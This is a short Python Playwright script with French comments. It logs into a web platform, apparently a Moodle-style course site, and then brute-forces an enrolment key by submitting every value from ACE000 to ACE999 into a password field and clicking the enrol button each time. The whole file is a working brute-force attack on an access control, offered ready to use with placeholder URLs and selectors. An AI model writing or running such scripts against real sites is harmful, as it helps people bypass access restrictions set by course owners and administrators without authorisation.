from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    # Lancer le navigateur avec l'interface visible (headless=False)
    browser = p.chromium.launch(headless=False)
    page = browser.new_page()

    # Étape 1 : Accéder à la page de login
    page.goto("https://url/login/index.php")

    # Étape 2 : Remplir le formulaire de login
    page.fill('input#username', 'USERNAME')  # Nom d'utilisateur
    page.fill('input#password', 'PASSWORD')  # Mot de passe

    # Étape 3 : Soumettre le formulaire de login
    page.click('button[type="submit"]')

    # Attendre que la page se charge après connexion
    page.wait_for_timeout(3000)  # Attendre 3 secondes pour s'assurer que la page de connexion est terminée

    # Étape 4 : Accéder à la page où le formulaire de clé doit être soumis
    page.goto("formurl.com")

    # Étape 5 : Boucle pour tester toutes les combinaisons de clés de ACE000 à ACE999
    for i in range(1000):
        key = f"ACE{i:03d}"  # Générer la clé de la forme ACE000 à ACE999
        print(key)
        # Remplir le champ avec la clé générée
        page.fill('input#PASSWORDINPUTID', key)  # Champ de mot de passe

        # Cliquer sur le bouton "M'inscrire"
        page.click('input#SUBMITBUTTONID')  # Sélecteur pour le bouton "M'inscrire"

        # Attendre 1 seconde entre chaque tentative pour éviter de surcharger le serveur
        page.wait_for_timeout(500)

    # Fermer le navigateur une fois terminé
    browser.close()
